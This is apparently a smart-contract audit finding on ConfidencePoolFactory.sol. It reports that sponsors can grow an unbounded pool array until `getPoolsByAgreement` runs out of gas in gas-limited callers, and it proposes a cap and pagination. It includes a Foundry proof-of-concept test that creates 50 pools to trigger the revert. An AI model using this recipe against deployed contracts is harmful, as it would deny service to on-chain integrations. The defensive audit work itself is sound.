### Title
Unbounded `_poolsByAgreement` array enables sponsor-driven OOG DoS of `getPoolsByAgreement` — (`File: src/ConfidencePoolFactory.sol`)

### Summary
`createPool` imposes no cap on how many pools a single agreement owner may create for one agreement, so `_poolsByAgreement[agreement]` grows without bound. `getPoolsByAgreement` returns the entire array in one call with no pagination or gas guard, so once the array is large enough any on-chain consumer that calls it inside a gas-constrained context (e.g. a callback forwarding a fixed stipend) will revert out-of-gas, permanently DoS-ing that integration for the targeted agreement.

### Finding Description
`createPool` (lines 67–114, `ConfidencePoolFactory.sol`) checks token allowlist, agreement validity, expiry lead-time, and caller ownership, but contains **no upper bound on `_poolsByAgreement[agreement].length`**. Each successful call appends one address to the dynamic storage array (line 103). `getPoolsByAgreement` (lines 117–119) unconditionally copies the entire array into memory and returns it:

```solidity
function getPoolsByAgreement(address agreement) external view returns (address[] memory) {
    return _poolsByAgreement[agreement];
}
```

Returning a dynamic `address[]` from storage costs roughly `~2 100` gas per element for the cold `SLOAD` of each 32-byte slot, plus ABI-encoding overhead. At N ≈ 45–50 pools the call already exceeds 100 000 gas. An agreement owner (sponsor) — a non-trusted actor in the protocol's own actor taxonomy — can call `createPool` N times with minimal per-call parameters (same token, same expiry, empty or single-element scope) to inflate the array to any size. No trusted-role action is required; the factory owner's pause only prevents *future* additions, not the already-inflated array.

Reachable path:
1. Sponsor owns a valid agreement; factory owner has allowlisted at least one token (normal operating state).
2. Sponsor calls `createPool(agreement, token, expiry, 0, recovery, [account])` in a loop N times — each call succeeds because every check passes and the salt incorporates `_poolsByAgreement[agreement].length` (line 86), guaranteeing unique clone addresses.
3. Any contract that subsequently calls `factory.getPoolsByAgreement(agreement)` with a gas budget below the cost of loading N addresses OOGs and reverts.

`poolCountByAgreement` (line 122) is a separate O(1) function and is unaffected, but it does not substitute for `getPoolsByAgreement` in integrations that need the actual addresses.

### Impact Explanation
Any on-chain protocol integration — router, aggregator, settlement contract, or callback — that calls `getPoolsByAgreement` inside a gas-constrained context is permanently DoS'd for the targeted agreement once N is large enough. The DoS is irreversible: the array cannot shrink, and the factory owner's only lever (pause) only stops new additions. Off-chain callers (subgraphs, frontends) are unaffected because they use `eth_call` with no gas cap, but on-chain consumers lose liveness permanently.

### Likelihood Explanation
The sponsor is the agreement owner — a role reachable by any entity that creates a BattleChain Safe Harbor agreement, with no protocol-level vetting. The preconditions (valid agreement, one allowlisted token) are the normal operating state of the factory. The attack is repeatable until the sponsor runs out of ETH for gas; each `createPool` call costs on the order of a clone deployment plus initialization, which is expensive but not prohibitive for a motivated attacker. The attack is one-shot permanent: once the array is large enough, no remediation short of a factory upgrade can fix the affected agreement's entry.

### Recommendation
Add a per-agreement pool cap in `createPool`, e.g.:

```solidity
uint256 private constant _MAX_POOLS_PER_AGREEMENT = 64; // governance-tunable

// inside createPool, before the push:
if (_poolsByAgreement[agreement].length >= _MAX_POOLS_PER_AGREEMENT) revert TooManyPools();
```

Alternatively (or additionally), add offset/limit pagination to `getPoolsByAgreement`:

```solidity
function getPoolsByAgreement(address agreement, uint256 offset, uint256 limit)
    external view returns (address[] memory page)
{
    address[] storage all = _poolsByAgreement[agreement];
    uint256 end = offset + limit > all.length ? all.length : offset + limit;
    page = new address[](end - offset);
    for (uint256 i = offset; i < end; i++) page[i - offset] = all[i];
}
```

Both mitigations together eliminate the DoS surface: the cap prevents unbounded growth, and pagination lets gas-constrained callers consume the list in chunks.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ConfidencePool} from "src/ConfidencePool.sol";
import {ConfidencePoolFactory} from "src/ConfidencePoolFactory.sol";
import {MockERC20} from "test/mocks/MockERC20.sol";
import {MockAgreement} from "test/mocks/MockAgreement.sol";
import {MockSafeHarborRegistry} from "test/mocks/MockSafeHarborRegistry.sol";

contract PoolConsumer {
    ConfidencePoolFactory public factory;
    constructor(address f) { factory = ConfidencePoolFactory(f); }
    // simulates a callback that calls getPoolsByAgreement with a fixed gas stipend
    function process(address agreement) external view returns (uint256) {
        address[] memory pools = factory.getPoolsByAgreement(agreement);
        return pools.length;
    }
}

contract UnboundedArrayDoSTest is Test {
    address internal constant SCOPE_ACCOUNT = address(0xC0FFEE);
    uint256 internal constant ONE = 1e18;

    MockERC20 internal token;
    MockSafeHarborRegistry internal registry;
    ConfidencePool internal poolImpl;
    ConfidencePoolFactory internal factory;
    MockAgreement internal agreement;
    PoolConsumer internal consumer;

    address internal sponsor = makeAddr("sponsor");
    address internal moderator = makeAddr("moderator");
    address internal recovery = makeAddr("recovery");

    function setUp() public {
        token = new MockERC20();
        registry = new MockSafeHarborRegistry();
        poolImpl = new ConfidencePool();
        agreement = new MockAgreement(sponsor);
        agreement.setContractInScope(SCOPE_ACCOUNT, true);
        registry.setAgreementValid(address(agreement), true);

        ConfidencePoolFactory impl = new ConfidencePoolFactory();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeCall(ConfidencePoolFactory.initialize,
                (address(registry), address(poolImpl), moderator))
        );
        factory = ConfidencePoolFactory(address(proxy));
        factory.setStakeTokenAllowed(address(token), true);
        consumer = new PoolConsumer(address(factory));
    }

    function _scope() internal pure returns (address[] memory a) {
        a = new address[](1);
        a[0] = SCOPE_ACCOUNT;
    }

    /// @notice Sponsor creates N pools; assert getPoolsByAgreement OOGs at 100 000 gas.
    function test_getPoolsByAgreement_OOG_after_N_pools() public {
        uint256 N = 50; // tune: find threshold where 100 000 gas is insufficient
        uint256 expiry = block.timestamp + 31 days;

        vm.startPrank(sponsor);
        for (uint256 i = 0; i < N; i++) {
            factory.createPool(address(agreement), address(token), expiry, 0, recovery, _scope());
        }
        vm.stopPrank();

        assertEq(factory.poolCountByAgreement(address(agreement)), N);

        // Direct call succeeds (no gas cap) — confirms array is populated
        address[] memory pools = factory.getPoolsByAgreement(address(agreement));
        assertEq(pools.length, N);

        // Constrained-gas call via PoolConsumer reverts OOG
        // consumer.process is called with exactly 100 000 gas
        (bool ok,) = address(consumer).call{gas: 100_000}(
            abi.encodeCall(PoolConsumer.process, (address(agreement)))
        );
        assertFalse(ok, "Expected OOG revert in low-gas context");
    }
}
```

**Expected assertions:**
- `factory.poolCountByAgreement(address(agreement)) == 50` — confirms the sponsor successfully inflated the array.
- `factory.getPoolsByAgreement(address(agreement)).length == 50` — confirms unconstrained access still works.
- `ok == false` — the constrained-gas call to `consumer.process` reverts (OOG), proving the DoS.

Tune `N` downward to find the exact threshold; empirically the break-even is around N = 45–50 for a 100 000 gas budget on a cold array.
